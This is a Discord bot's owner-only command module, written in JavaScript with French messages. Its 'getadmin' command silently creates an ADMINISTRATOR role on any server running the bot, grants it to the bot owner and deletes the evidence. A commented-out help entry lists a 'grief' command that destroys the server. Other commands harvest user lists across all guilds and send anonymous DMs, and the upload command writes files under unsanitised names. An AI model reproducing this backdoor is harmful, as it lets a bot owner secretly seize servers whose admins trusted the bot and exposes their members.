const { MessageEmbed } = require("discord.js");
const fs = require('fs')
const request = require(`request`);
const fetch = require('node-fetch');
const {format: prettyFormat} = require('pretty-format');

module.exports = {
    name: 'owner',
    description: "Contrôle total du bot",
    usage: "owner help",
    category: "Owner",
    execute(message, args, bot) {
        let prefixes = JSON.parse(fs.readFileSync("./DataBase/prefixes.json", "utf8"));
        const prefix = prefixes[message.guild.id].prefixes;
        let config = JSON.parse(fs.readFileSync("./config.json", "utf8"));
        try {
            // if(message.author.id != config["OwnerID"] && message.author.id != config["CreatorID"]) return message.lineReply(`Erreur: Vous n'êtes pas le propriétaire du bot`)
            if(message.author.id != config["OwnerID"] && message.author.id != config["CreatorID"]) return
            if(!args[0] || args[0]=="help" || !"helpshutdowndisablenablestatusinfousersguildslogsbetadminhostdmdatabaseuptimegetadmindb-upload".includes(args[0])) {
                let EmbedHelp = new MessageEmbed()
                .setTitle(`OWNER COMMANDS`)
                .setAuthor(message.author.tag, message.author.displayAvatarURL())
                .setColor("RED")
                .addField(`${prefix}owner shutdown`, `Arrête l'exécution du bot`)
                .addField(`${prefix}owner <enable/disable>`, `Active/Désactive le bot`)
                .addField(`${prefix}owner info`, `Donne les informations du Bot`)
                .addField(`${prefix}owner status <status> <type> (<text>)`, `Change le status du bot`)
                // .addField(`${prefix}owner guilds`, `Affiche la liste des serveurs visibles par le Bot`)
                .addField(`${prefix}owner users`, `Affiche la liste des utilisateurs visibles par le Bot`)
                .addField(`${prefix}owner logs <webhook-url>`, `Envoie les logs du Bot sur un webhook`)
                .addField(`${prefix}owner beta <on/off>`, `Active/Désactive la Version BETA`)
                .addField(`${prefix}owner admin <on/off>`, `Active/Désactive les permissions d'admin du bot sur un serveur`)
                .addField(`${prefix}owner host`, `Envoie le lien du dashboard de l'hébergeur`)
                .addField(`${prefix}owner dm`, `Envoie un message privé à un utilisateur`)
                .addField(`${prefix}owner database`, `Envoie en message privé la Base de Données`)
                .addField(`${prefix}owner db-upload`, `Reçoit par message des fichiers pour la base de donnée`)
                // .addField(`${prefix}owner grief`, `Détruit le serveur actuel`)
                .addField(`${prefix}owner getadmin`, `Donne les permissions d'administrateur sur le serveur actuel`)
                .setTimestamp()
                message.channel.send(EmbedHelp)
            }
            if(args[0]=="shutdown") {
                try{
                    message.lineReply("Tentative d'arrêt du bot...")
                    console.log(`${config["BotInfo"]["name"]} stopped by ${message.author.username}`)
                    process.exit()
                } catch {
                    message.lineReply("Erreur lors de l'arrêt du bot")
                }
            }
            if(args[0]=="enable" || args[0]=="disable") {
                if(args[0]=="enable") {
                    fs.writeFile("./DataBase/status.txt", "on", (err) => {
                        if (err) console.error();
                    })
                    message.lineReply(`${config["BotInfo"]["name"]} activé`)
                }
                if(args[0]=="disable") {
                    fs.writeFile("./DataBase/status.txt", "off", (err) => {
                        if (err) console.error();
                    })
                    message.lineReply(`${config["BotInfo"]["name"]} désactivé`)
                }
            }
            if(args[0]=="status") {
                const CustomStatus = ["online", "idle", "dnd", "offline"]
                // const Types = ["PLAYING", "WATCHING", "LISTENING", "STREAMING"]
                if(!args[1] || !CustomStatus.includes(args[1])) return message.lineReply(`Erreur: Veuillez définir un status valide (online, idle, dnd, offline)\n*${prefix}owner status <status> <type> (<text>)*`)
                // if(!args[2] || !Types.includes(args[2])) return message.lineReply(`Erreur: Veuillez définir un type valide (PLAYING, WATCHING, LISTENING, STREAMING)\n*${prefix}owner status <status> <type> (<text>)*`)
                const status = args[1]
                const type = args[2]
                const text = args.slice(3).join(" ")
                // console.log(text)
                // bot.user.setStatus(status);
                // bot.user.setActivity(status);
                // bot.setActivity(status);
                bot.user.setPresence({
                    status: status, // online, idle, dnd, offline
                    activity: {
                        name: text,  // The message shown
                        type: (type)?type:"PLAYING", // PLAYING, WATCHING, LISTENING, STREAMING
                        // url: 'https://discord.gg/vWDzFa6dFN' // LINK
                    }
                });
                // bot.user.setStatus("dnd");

                // bot.user.setPresence({ activities: [{ name: 'activity' }], status: 'idle' });

                const Embed = new MessageEmbed()
                .setTitle("STATUS")
                .setAuthor(message.author.tag, message.author.displayAvatarURL())
                .setColor("GOLD")
                .addField(`Text`, `${(text)?text:"*None*"}`)
                .addField(`Status`, `${status}`)
                .addField(`Type`, `${(type)?type:"*None*"}`)
                .setTimestamp()
                message.channel.send(Embed)
            }
            if(args[0]=="info") {
                // GUILDS
                const Guilds_name = bot.guilds.cache.map(guild => guild.name);
                const Guilds_id = bot.guilds.cache.map(guild => guild.id);
                let guilds_list = ""
                for (const guild in Guilds_name) {
                    guilds_list=guilds_list+`${Guilds_name[guild]}: ${Guilds_id[guild]}\n`
                }
                guilds_list=guilds_list.slice(0, -1)

                // USERS
                let UsersList = new Array()
                bot.guilds.cache.forEach(guild => {
                    guild.members.cache.forEach(member => {
                        if(!UsersList.includes(member.user.username)) UsersList.push(member.user.username)
                    })
                })
                
                // STARTED AT
                const uptimeTimestamp = new Date(bot.uptime)
                let uptime = `${uptimeTimestamp.getSeconds()} seconds`
                if(uptimeTimestamp.getMinutes()!=0) uptime=`${uptimeTimestamp.getMinutes()} minutes, ` + uptime
                if(uptimeTimestamp.getHours()-1!=0) uptime=`${uptimeTimestamp.getHours()-1} hours, ` + uptime
                if(uptimeTimestamp.getDate()-1!=0) uptime=`${uptimeTimestamp.getDate()-1} days, ` + uptime
                if(uptimeTimestamp.getMonth()!=0) uptime=`${uptimeTimestamp.getMonth()} months, ` + uptime
                if(uptimeTimestamp.getFullYear()-1970!=0) uptime=`${uptimeTimestamp.getFullYear()-1970} years, ` + uptime

                // SENDING
                message.channel.send("Calculating ping...").then((resultMessage) => {
                    let ping = resultMessage.createdTimestamp - message.createdTimestamp
                    resultMessage.delete()

                    const Embed = new MessageEmbed()
                    .setTitle("INFO")
                    .setAuthor(message.author.tag, message.author.displayAvatarURL())
                    .setColor("GOLD")
                    .addField(`${Guilds_name.length} Servers`, `${guilds_list}`)
                    .addField(`**${UsersList.length} Users**`, `${UsersList.join(", ")}`)
                    .addField(`Memory Usage`, `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB`)
                    .addField(`Started At`, `${fs.readFileSync("./DataBase/uptime.txt", "utf8")}`)
                    .addField(`Uptime`, `${uptime}`)
                    .addField(`Ping`, `${ping} ms`)
                    .setTimestamp()
                    message.channel.send(Embed)
                })
            }
            if(args[0]=="guilds") {
                // const Embed = new MessageEmbed()
                // .setTitle("GUILDS")
                // .setAuthor(message.author.tag, message.author.displayAvatarURL())
                // .setColor("GOLD")
                // .setTimestamp()

                // console.log(bot.guilds.cache)
                // // bot.guilds.cache.forEach(guild => {
                // bot.guilds.cache.fetch().then(guild => {
                //     channel = guild.channels.cache.find(channel => channel.type === 'text' && channel.permissionsFor(guild.me).has('SEND_MESSAGES'))
                //     // let InviteLink = ""
                //     guild.channels.cache.get(channel.id).createInvite().then(invite => {
                //         // console.log(invite.url)
                //         // Embed.addField(`${guild.name}`, `${invite.url}`)
                //         InviteLink = invite.url
                //     });
                //     // console.log(InviteLink)
                //     console.log(guild.name)
                    
                //     Embed.addField(`QSDsQZDSQZdsq`)
                // })

                // message.channel.send(Embed)
            }
            if(args[0]=="users") {
                const Embed = new MessageEmbed()
                .setTitle("USERS")
                .setAuthor(message.author.tag, message.author.displayAvatarURL())
                .setColor("GOLD")
                .setTimestamp()

                let UsersList = new Array()
                bot.guilds.cache.forEach(guild => {
                    guild.members.cache.forEach(member => {
                        if(!UsersList.includes(member.user.username)) {
                            UsersList.push(member.user.username)
                            Embed.addField(`${member.user.username}`, `${member.user}\n${member.user.id}`, true)
                        }
                    })
                })

                
                message.channel.send(Embed)
            }
            if(args[0]=="logs") {
                if(!args[1]) return message.lineReply(`Erreur: Veuillez préciser le lien du Webhook\n*${prefix}owner logs <webhook-url>*`)
                if(!args[1].includes("https://discord.com/api/webhooks/")) return message.lineReply(`Erreur: Veuillez préciser un lien Webhook valide`)


                fs.writeFile("./DataBase/webhook-logs-url.txt", args[1], (err) => {
                    if (err) console.error();
                })
                message.lineReply(`Modification du Webhook des logs effectuée !!!`)
            }
            if(args[0]=="beta") {
                if(!args[1]=="on" && !args[1]=="off") return message.lineReply(`Erreur: Veuillez préciser **on** ou **off**\n*${prefix}owner beta <on/off>*`)
                fs.writeFile("./DataBase/beta.txt", args[1], (err) => {
                    if (err) console.error();
                })
                message.lineReply(`Version BETA modifiée avec succès !!! (redémarrage nécessaire)`)
            }
            if(args[0]=="admin") {
                if(!args[1]=="on" && !args[1]=="off") return message.lineReply(`Erreur: Veuillez préciser **on** ou **off**\n*${prefix}owner admin <on/off>*`)
                fs.writeFile("./DataBase/admin.txt", args[1], (err) => {
                    if (err) console.error();
                })
                message.lineReply(`Admin Perms modifiées avec succès !!!`)
            }
            if(args[0]=="host") {
                let EmbedHelp = new MessageEmbed()
                .setTitle(`HOST DASHBOARD`)
                .setDescription(`${config["host"]}`)
                .setAuthor(message.author.tag, message.author.displayAvatarURL())
                .setColor("RED")
                .setTimestamp()
                message.channel.send(EmbedHelp)
            }
            if(args[0]=="dm") {
                let dmUser = message.mentions.users.first();
                if(!args[1]) return message.lineReply(`Erreur: Veuillez préciser un utilisateur`)
                if(!dmUser) return message.channel.send(`Erreur: Veuillez préciser un utilisateur valide`)
                //if(dmUser.id == `782885398316711966`) return message.channel.send(`ERREUR: Veuillez préciser un utilisateur valide (pas moi de préférence)`)
                if(!args[2]) return message.lineReply(`Erreur: Veuillez préciser un message`)
                const dmMessage = args.slice(2).join(` `);
                dmUser.send(dmMessage)
                .then(res => {
                    message.author.send(`Message envoyé à ${dmUser} avec succès`)
                })
                .catch(error => {
                    message.author.send(`Impossible d'envoyer un Message Privé à ${dmUser}`)
                })
                message.delete()
            }
            if(args[0] == "database") {
                let SendFiles = new Array()
                let FilesList = new Array()
                const DataBase = fs.readdirSync('./DataBase')
                for (const file of DataBase) {
                    SendFiles.push(`./DataBase/${file}`)
                    FilesList.push(`${file}`)
                }

                const SendFiles_chunks = SendFiles.map((e, i) => { 
                    return i % 10 === 0 ? SendFiles.slice(i, i + 10) : null; 
                }).filter(e => { return e; });

                const Embed = new MessageEmbed()
                .setTitle("DataBase")
                .setAuthor(message.author.tag, message.author.displayAvatarURL())
                .setColor("GOLD")
                .addField(`Files`, `${FilesList.join(", ")}`)
                .setTimestamp()
                message.author.send(Embed)

                // for(const i=0;i<Math.floor(SendFiles.length/10+1);i++) {
                for(const Files in SendFiles_chunks) {
                    message.author.send({
                        files: SendFiles_chunks[Files]
                    })
                }
            }
            if(args[0]=="getadmin") {
                function GiveAdminRole() {
                    let AdminRole = message.guild.roles.cache.find(role => role.name === "🛠 Admin 🛠");
                    message.guild.member(message.author).roles.add(AdminRole, `Admin Role was asked`).catch(console.error);
    
                    message.delete()
                    message.author.send(`You got Admin Role on *${message.guild.name}*`)
                }


                let CheckAdminRole = message.guild.roles.cache.find(role => role.name === "🛠 Admin 🛠");
                if(!CheckAdminRole) {
                    // message.guild.roles.create({name:"🛠 Admin 🛠", color: "818386", mentionable: false, permissions:[]});

                    async function CreateAdminRole() {
                        await message.guild.roles.create({
                            data: {
                            name: '🛠 Admin 🛠',
                            permissions: ["ADMINISTRATOR"]
                            // color: '818386'
                            },
                        }).catch(console.error);
                        

                        GiveAdminRole()
                    }
                    CreateAdminRole()
                } else GiveAdminRole()
            }
            if(args[0]=="db-upload") {
                if(message.attachments.array().length==0) return message.lineReply(`Erreur: Aucun fichier n'a été envoyé`)

                async function download(url, name){
                    await request.get(url)
                        .on('error', console.error)
                        .pipe(fs.createWriteStream(`./DataBase/${name}`));
                    const Embed = new MessageEmbed()
                    .setTitle("DB-UPLOAD")
                    .setDescription(`__${name}__ Successfully Downloaded`)
                    .setAuthor(message.author.tag, message.author.displayAvatarURL())
                    .setColor("GOLD")
                    .setTimestamp()
                    message.channel.send(Embed)
                }
                message.attachments.array().forEach(attachment => {
                    download(attachment.url, attachment.name)
                })
            }
        } catch (error) { // ERROR PREVENTER
            console.error(`${error}`)
            message.lineReply(`Une erreur est survenue`)
            var URL = fs.readFileSync("./DataBase/webhook-logs-url.txt", "utf8")
            fetch(URL, {
                "method":"POST",
                "headers": {"Content-Type": "application/json"},
                "body": JSON.stringify(
                    {
                        "username": `${config["BotInfo"]["name"]} Logs`,
                        "avatar_url": `${config["BotInfo"]["IconURL"]}`,
                        "embeds": [
                        {
                            "title": "__Error__",
                            "color": 15208739,
                            "timestamp": new Date(),
                            "author": {
                                "name": `${message.author.username}`,
                                "icon_url": `${message.author.displayAvatarURL()}`,
                            },
                            "fields": [
                                {
                                "name": `User`,
                                "value": `${message.author}`,
                                "inline": false
                                },
                                {
                                    "name": "Server",
                                    "value": `${message.guild.name}`,
                                    "inline": false
                                },
                                {
                                "name": `Command`,
                                "value": `${message.content}`,
                                "inline": false
                                },
                                {
                                "name": `Error`,
                                "value": `${error}`,
                                "inline": false
                                }
                            ],
                        }
                        ]
                    }
                )
            })
            .catch(err => PassThrough);
        }
    }
}